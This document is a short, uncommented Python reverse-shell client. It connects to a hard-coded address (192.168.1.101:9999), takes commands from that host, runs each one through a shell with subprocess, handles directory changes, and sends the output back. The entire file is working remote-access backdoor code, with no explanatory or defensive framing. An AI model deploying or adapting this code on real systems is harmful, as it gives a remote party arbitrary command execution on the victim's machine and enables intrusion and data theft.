import os
import socket
import subprocess

s = socket.socket()
host = "192.168.1.101"
port = 9999
s.connect((host,port))

while True:
    data = s.recv(1024)
    try:
        if data[:2].decode("utf-8") == 'cd':
            if data[:].decode("utf-8") == 'cd':
                cwd = os.getcwd() + ">"
                s.send(str.encode(cwd))
                print(os.getcwd())
            elif data[:].decode("utf-8") == 'cd ..':
                os.chdir("..")
                cwd = os.getcwd()
                s.send(str.encode(cwd))
                print(os.getcwd())
            elif data[2] == " ":
                os.chdir(data[3:].decode("utf-8"))
                cwd = os.getcwd()
                s.send(str.encode(cwd))
                print(os.getcwd())
            else:
                cwd = os.getcwd() + ">"
                s.send(str.encode(cwd))
                print(os.getcwd())
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            cwd = os.getcwd() + ">"
            s.send(str.encode(output_str + cwd))
            print(output_str)
    except os.error as msg:
        print("Error on OS Module : "+str(msg))
        pass
